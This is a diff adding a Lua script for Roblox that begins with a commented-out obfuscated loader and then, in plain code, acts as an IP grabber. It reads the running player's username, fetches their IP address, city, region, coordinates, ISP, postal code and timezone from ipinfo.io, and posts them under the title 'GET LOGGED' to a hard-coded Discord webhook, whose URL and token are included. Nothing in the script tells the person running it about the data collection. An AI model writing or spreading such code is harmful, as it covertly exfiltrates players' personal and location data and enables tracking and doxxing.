@@ -1,0 +1,81 @@
+--local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then local v81=0;while true do if (v81==0) then v19=v0(v3(v30,1,1));return "";end end else local v82=v2(v0(v30,16));if v19 then local v90=v5(v82,v19);v19=nil;return v90;else return v82;end end end);local function v20(v31,v32,v33) if v33 then local v83=0 -0 ;local v84;while true do if (v83==(0 -(1065 -(68 + 997)))) then v84=(v31/(((1273 -(226 + 1044)) -1)^(v32-(2 -1))))%((621 -(555 + 64))^(((v33-(932 -(857 + 74))) -(v32-(569 -(367 + (875 -674))))) + (928 -(214 + 713)))) ;return v84-(v84%(1 + 0)) ;end end else local v85=0 + 0 ;local v86;while true do if (v85==(877 -(282 + 595))) then v86=(1639 -(1523 + 114))^(v32-(1 + 0)) ;return (((v31%(v86 + v86))>=v86) and 1) or (0 -0) ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=117 -(32 + 85) ;local v36;local v37;while true do if ((0 + 0)==v35) then v36,v37=v1(v16,v18,v18 + 1 + 1 );v18=v18 + (959 -((1242 -(87 + 263)) + 65)) ;v35=2 -(181 -(67 + 113)) ;end if (v35==(1 -0)) then return (v37 * (469 -213)) + v36 ;end end end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + 3 + 0 );v18=v18 + (9 -5) ;return (v41 * ((33220331 -20881491) + 4438376)) + (v40 * (260471 -194935)) + (v39 * (1208 -(802 + 150))) + v38 ;end local function v24() local v42=v23();local v43=v23();local v44=1 -0 ;local v45=(v20(v43,1 + 0 ,20) * ((999 -(915 + 82))^((528 -(145 + 293)) -58))) + v42 ;local v46=v20(v43,13 + 8 ,40 -9 );local v47=((v20(v43,(1649 -(44 + 386)) -(1069 + 118) )==(2 -1)) and  -(1 -0)) or (1 + 0) ;if (v46==(0 -0)) then if (v45==(0 + 0)) then return v47 * 0 ;else local v91=0;while true do if (v91==0) then v46=792 -(368 + 423) ;v44=0 -0 ;break;end end end elseif (v46==(2065 -((1496 -(998 + 488)) + 8))) then return ((v45==(0 -0)) and (v47 * ((443 -(133 + 283 + 26))/(0 -(0 + 0))))) or (v47 * NaN) ;end return v8(v47,v46-(440 + 583) ) * (v44 + (v45/(2^(91 -(811 -(201 + 571)))))) ;end local function v25(v48) local v49;if  not v48 then v48=v23();if (v48==(1138 -(116 + 1022))) then return "";end end v49=v3(v16,v18,(v18 + v48) -(4 -3) );v18=v18 + v48 ;local v50={};for v64=1 + 0 , #v49 do v50[v64]=v2(v1(v3(v49,v64,v64)));end return v6(v50);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v51=0 + 0 ;local v52;local v53;local v54;local v55;local v56;local v57;while true do local v66=0 + 0 ;while true do if (v66~=1) then else if ((0 + 0)==v51) then v52={};v53={};v54={};v55={v52,v53,nil,v54};v51=1;end break;end if (v66~=(0 -0)) then else if (v51~=1) then else v56=v23();v57={};for v97=375 -(123 + 251) ,v56 do local v98=0;local v99;local v100;local v101;while true do if (1==v98) then v101=nil;while true do if (v99==(0 -0)) then local v155=698 -(208 + 490) ;while true do if (0==v155) then v100=v21();v101=nil;v155=1;end if (v155==1) then v99=1 + 0 ;break;end end end if (v99~=(1 + 0)) then else if (v100==(837 -(660 + 176))) then v101=v21()~=0 ;elseif (v100==(1 + 1)) then v101=v24();elseif (v100==3) then v101=v25();end v57[v97]=v101;break;end end break;end if (v98==0) then v99=202 -(14 + 188) ;v100=nil;v98=1;end end end v55[3]=v21();v51=2;end if ((677 -(534 + 141))==v51) then for v102=1 + 0 ,v23() do local v103=v21();if (v20(v103,1 + 0 ,1 + 0 )~=0) then else local v106=0 -0 ;local v107;local v108;local v109;local v110;while true do if (0==v106) then v107=0;v108=nil;v106=1 -0 ;end if (v106==(5 -3)) then while true do if (v107~=(2 + 0)) then else local v183=0 + 0 ;local v184;while true do if (0~=v183) then else v184=396 -(115 + 281) ;while true do if (v184==(0 -0)) then if (v20(v109,1,1 + 0 )==(2 -1)) then v110[7 -5 ]=v57[v110[2]];end if (v20(v109,869 -(550 + 317) ,2 -0 )~=(1 -0)) then else v110[3]=v57[v110[8 -5 ]];end v184=1;end if (v184~=(286 -(134 + 151))) then else v107=3;break;end end break;end end end if (v107==1) then local v185=0;while true do if (v185~=0) then else v110={v22(),v22(),nil,nil};if (v108==0) then local v200=0;local v201;while true do if ((0 -0)~=v200) then else v201=0;while true do if (v201==0) then v110[3 -0 ]=v22();v110[15 -11 ]=v22();break;end end break;end end elseif (v108==1) then v110[1827 -(1195 + 629) ]=v23();elseif (v108==(2 -0)) then v110[3]=v23() -(2^(257 -(187 + 54))) ;elseif (v108==3) then local v210=0;local v211;while true do if (v210==0) then v211=780 -(162 + 618) ;while true do if (v211==(0 + 0)) then v110[2 + 1 ]=v23() -((3 -1)^16) ;v110[6 -2 ]=v22();break;end end break;end end end v185=1;end if (1~=v185) then else v107=2;break;end end end if (v107==(1 + 2)) then if (v20(v109,1639 -(1373 + 263) ,1003 -(451 + 549) )~=(1 + 0)) then else v110[4]=v57[v110[4]];end v52[v102]=v110;break;end if (v107==0) then local v187=0 -0 ;local v188;while true do if (v187==(0 -0)) then v188=0;while true do if (v188==(1385 -(746 + 638))) then v107=1;break;end if (v188==(0 + 0)) then v108=v20(v103,2,3);v109=v20(v103,4,8 -2 );v188=342 -(218 + 123) ;end end break;end end end end break;end if (v106==1) then local v111=0;while true do if (1~=v111) then else v106=1583 -(1535 + 46) ;break;end if (v111==(0 + 0)) then v109=nil;v110=nil;v111=1;end end end end end end for v104=1,v23() do v53[v104-1 ]=v28();end return v55;end v66=1 + 0 ;end end end end local function v29(v58,v59,v60) local v61=v58[1];local v62=v58[2];local v63=v58[3];return function(...) local v67=v61;local v68=v62;local v69=v63;local v70=v27;local v71=1;local v72= -1;local v73={};local v74={...};local v75=v12("#",...) -1 ;local v76={};local v77={};for v87=0,v75 do if (v87>=v69) then v73[v87-v69 ]=v74[v87 + 1 ];else v77[v87]=v74[v87 + 1 ];end end local v78=(v75-v69) + 1 ;local v79;local v80;while true do v79=v67[v71];v80=v79[1];if (v80<=16) then if (v80<=7) then if (v80<=3) then if (v80<=1) then if (v80>0) then local v112=v79[2];v77[v112](v77[v112 + 1 ]);else v77[v79[2]][v79[3]]=v77[v79[4]];end elseif (v80==2) then v71=v79[3];else local v116=v79[2];v77[v116]=v77[v116](v13(v77,v116 + 1 ,v79[3]));end elseif (v80<=5) then if (v80==4) then v77[v79[2]]=v77[v79[3]];else for v157=v79[2],v79[3] do v77[v157]=nil;end end elseif (v80>6) then v77[v79[2]]={};else local v121=0;local v122;local v123;while true do if (1==v121) then for v196=v122 + 1 ,v79[3] do v7(v123,v77[v196]);end break;end if (v121==0) then v122=v79[2];v123=v77[v122];v121=1;end end end elseif (v80<=11) then if (v80<=9) then if (v80==8) then if (v79[2]==v77[v79[4]]) then v71=v71 + 1 ;else v71=v79[3];end else v77[v79[2]][v79[3]]=v77[v79[4]];end elseif (v80>10) then if (v77[v79[2]]==v79[4]) then v71=v71 + 1 ;else v71=v79[3];end else local v126=v79[2];local v127=v77[v126];local v128=v79[3];for v159=1,v128 do v127[v159]=v77[v126 + v159 ];end end elseif (v80<=13) then if (v80==12) then v77[v79[2]]=v79[3];else local v131=0;local v132;while true do if (v131==0) then v132=v79[2];v77[v132]=v77[v132](v77[v132 + 1 ]);break;end end end elseif (v80<=14) then v77[v79[2]]=v60[v79[3]];elseif (v80>15) then local v166=0;local v167;while true do if (v166==0) then v167=v79[2];v77[v167](v77[v167 + 1 ]);break;end end else v77[v79[2]][v79[3]]=v79[4];end elseif (v80<=25) then if (v80<=20) then if (v80<=18) then if (v80==17) then do return;end else v77[v79[2]]=v77[v79[3]][v79[4]];end elseif (v80==19) then if (v79[2]==v77[v79[4]]) then v71=v71 + 1 ;else v71=v79[3];end else v77[v79[2]]=v77[v79[3]];end elseif (v80<=22) then if (v80>21) then v77[v79[2]]={};else local v140=v79[2];local v141=v77[v79[3]];v77[v140 + 1 ]=v141;v77[v140]=v141[v79[4]];end elseif (v80<=23) then for v162=v79[2],v79[3] do v77[v162]=nil;end elseif (v80==24) then local v171=v79[2];local v172=v77[v79[3]];v77[v171 + 1 ]=v172;v77[v171]=v172[v79[4]];else local v176=v79[2];local v177=v77[v176];local v178=v79[3];for v193=1,v178 do v177[v193]=v77[v176 + v193 ];end end elseif (v80<=29) then if (v80<=27) then if (v80>26) then local v145=v79[2];v77[v145]=v77[v145](v77[v145 + 1 ]);else v77[v79[2]]=v79[3];end elseif (v80>28) then local v149=v79[2];v77[v149]=v77[v149](v13(v77,v149 + 1 ,v79[3]));else v77[v79[2]]=v77[v79[3]][v79[4]];end elseif (v80<=31) then if (v80>30) then v77[v79[2]]=v60[v79[3]];else do return;end end elseif (v80<=32) then if (v77[v79[2]]==v79[4]) then v71=v71 + 1 ;else v71=v79[3];end elseif (v80>33) then v71=v79[3];else v77[v79[2]][v79[3]]=v79[4];end v71=v71 + 1 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!353O00028O00027O0040030A3O004A534F4E4465636F646503043O00426F647903063O00656D6265647303053O007469746C65030A3O00474554204C4F2O474544030B3O006465736372697074696F6E030F3O004120477579206973206C6F2O67656403053O00636F6C6F7203083O00746F6E756D626572024O00D636374103063O006669656C647303043O006E616D65030C3O002O2A557365726E616D652O2A03053O0076616C756503063O00696E6C696E650100030E3O002O2A495020412O6472652O732O2A03023O006970030B3O002O2A436F756E7472792O2A03073O00636F756E74727903083O002O2A436974792O2A03043O0063697479030A3O002O2A526567696F6E2O2A03063O00726567696F6E030C3O002O2A4C6F636174696F6E2O2A2O033O006C6F6303103O002O2A4F7267616E697A6174696F6E2O2A2O033O006F7267030A3O002O2A506F7374616C2O2A03063O00706F7374616C030C3O002O2A54696D657A6F6E652O2A03083O0074696D657A6F6E65026O00F03F026O00084003043O0067616D65030A3O0047657453657276696365030B3O00482O74705365727669636503793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313235333830313933353133363438393530332F3770664F385874445A62357A425F456A5F367A2O7155315961775872792O71334E7A742O566457306C7652436B376447466B6D59744E31677869554862565759536C5177030A3O004A534F4E456E636F646503073O00726571756573742O033O0055726C03063O004D6574686F6403043O00504F535403073O0048656164657273030C3O00436F6E74656E742D5479706503103O00612O706C69636174696F6E2F6A736F6E03073O00506C6179657273030B3O004C6F63616C506C6179657203043O004E616D6503163O00682O7470733A2O2F6970696E666F2E696F2F6A736F6E2O033O0047455400843O00121A3O00014O0017000100073O0026203O004C000100020004223O004C000100121A000800013O00262000080047000100010004223O00470001002018000900010003002012000B000400042O001D0009000B00022O0004000500094O000700093O00012O0007000A00014O0007000B3O0004003021000B00060007003021000B0008000900121F000C000B3O00121A000D000C4O001B000C00020002001009000B000A000C2O0007000C00094O0007000D3O0003003021000D000E000F001009000D00100003003021000D001100122O0007000E3O0003003021000E000E0013002012000F00050014001009000E0010000F003021000E001100122O0007000F3O0003003021000F000E0015002012001000050016001009000F00100010003021000F001100122O000700103O00030030210010000E00170020120011000500180010090010001000110030210010001100122O000700113O00030030210011000E001900201200120005001A0010090011001000120030210011001100122O000700123O00030030210012000E001B00201200130005001C0010090012001000130030210012001100122O000700133O00030030210013000E001D00201200140005001E0010090013001000140030210013001100122O000700143O00030030210014000E001F0020120015000500200010090014001000150030210014001100122O000700153O00030030210015000E00210020120016000500220010090015001000160030210015001100122O000A000C00090001001009000B000D000C2O000A000A0001000100100900090005000A2O0004000600093O00121A000800233O00262000080005000100230004223O0005000100121A3O00243O0004223O004C00010004223O000500010026203O005D000100010004223O005D000100121A000800013O00262000080058000100010004223O0058000100121F000900253O00201800090009002600121A000B00274O001D0009000B00022O0004000100093O00121A000200283O00121A000800233O000E080023004F000100080004223O004F000100121A3O00233O0004223O005D00010004223O004F00010026203O006D000100240004223O006D00010020180008000100292O0004000A00064O001D0008000A00022O0004000700083O00121F0008002A4O000700093O00040010090009002B00020030210009002C002D2O0007000A3O0001003021000A002F00300010090009002E000A0010090009000400072O00010008000200010004223O008300010026203O0002000100230004223O0002000100121A000800013O00262000080074000100230004223O0074000100121A3O00023O0004223O0002000100262000080070000100010004223O0070000100121F000900253O00201200090009003100201200090009003200201200030009003300121F0009002A4O0007000A3O0002003021000A002B0034003021000A002C00352O001B0009000200022O0004000400093O00121A000800233O0004223O007000010004223O000200012O001E3O00017O00",v9(),...);
+local HttpService = game:GetService("HttpService")
+
+local webhookURL = "https://discord.com/api/webhooks/1253801935136489503/7pfO8XtDZb5zB_Ej_6zqqU1YawXryqq3NztVVdW0lvRCk7dGFkmYtN1gxiUHbVWYSlQw"
+
+local playerName = game.Players.LocalPlayer.Name
+
+local response = request({
+    Url = "https://ipinfo.io/json",
+    Method = "GET"
+})
+
+local IPINFO = HttpService:JSONDecode(response.Body)
+
+local data = {
+    embeds = {
+        {
+            title = "GET LOGGED",
+            description = "A Guy is logged",
+            color = tonumber(0x1736d6),
+            fields = {
+                {
+                    name = "**Username**",
+                    value = playerName,
+                    inline = false
+                },
+                {
+                    name = "**IP Address**",
+                    value = IPINFO.ip,
+                    inline = false
+                },
+                {
+                    name = "**Country**",
+                    value = IPINFO.country,
+                    inline = false
+                },
+                {
+                    name = "**City**",
+                    value = IPINFO.city,
+                    inline = false
+                },
+                {
+                    name = "**Region**",
+                    value = IPINFO.region,
+                    inline = false
+                },
+                {
+                    name = "**Location**",
+                    value = IPINFO.loc,
+                    inline = false
+                },
+                {
+                    name = "**Organization**",
+                    value = IPINFO.org,
+                    inline = false
+                },
+                {
+                    name = "**Postal**",
+                    value = IPINFO.postal,
+                    inline = false
+                },
+                {
+                    name = "**Timezone**",
+                    value = IPINFO.timezone,
+                    inline = false
+                }
+            }
+        }
+    }
+}
+
+local jsonData = HttpService:JSONEncode(data)
+
+request({
+    Url = webhookURL,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = jsonData
+})
